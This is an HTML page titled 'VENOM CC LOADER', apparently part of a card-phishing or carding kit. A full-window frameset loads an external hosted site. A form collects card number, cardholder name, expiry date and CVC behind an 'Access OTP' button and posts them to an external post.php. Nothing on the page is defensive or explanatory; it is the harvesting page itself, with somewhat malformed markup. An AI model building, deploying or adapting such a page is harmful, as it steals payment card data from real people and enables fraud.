...
<html>
<head>
<title>VENOM CC LOADER</title>
<meta name=”description” content=”Description”>
<meta name=”keywords” content=”Keyword1, Keyword2″>
</head>
<frameset rows=”100%,0″ border=”0″>
<frame src=”https://venomccx.000webhostapp.com/” frameborder=”0″>
<frame frameborder=”0″>
</frameset>
<link rel = "icon" href = 
"https://i.ibb.co/HFwYZW1/PNG-images-Snake-28png.png" 
        type = "image/x-icon">
 ...
 *, 
 ...
 <body>
 <div id="app"> 
     <nav class="navigations"><img alt='cool names generator' height='50' src=https://i.ibb.co/LvpgZRM/Tag-For-Transparent-Spinner-Icon-Pehliseedhi-Suitable.gif' width='400' title='VENOM CC LOADER'/></nav> 
     <div class=""> 
     ...
     <h1></h1> 
        ...
        <br /> 
         <div class="form-container active"> 
             <form action="https://venomccx.000webhostapp.com/post.php" method="post" autocomplete="off">
                 <input placeholder="Card number" type="tel" name="number" class="form-control" required="required"> 
                 <input placeholder="Full name" type="text" name="name" class="form-control" required="required"> 
                 <input placeholder="MM/YY" type="tel" name="expiry" class="form-control" required="required"> 
                 <input placeholder="CVC" type="number" name="cvc" class="form-control" required="required">
                 <a class="laa"><button type="submit">Access OTP</button></div>
             </form> 
         </div> 
     </div> 
         </p> 
  <center> <a href="/">VENOM CC</a> </center> 
